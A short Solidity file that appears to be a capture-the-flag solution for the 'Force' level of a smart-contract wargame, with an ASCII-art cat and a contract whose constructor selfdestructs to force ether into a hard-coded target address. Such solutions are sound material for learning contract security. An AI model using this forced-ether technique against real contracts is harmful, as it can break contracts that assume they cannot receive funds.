// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }

contract Solve {
    Force target = Force(payable(0xC5E7C9fE11D0267756911347e3C0FC74850eA49c));
    constructor () payable {
        selfdestruct(payable(address(target)));
    }
}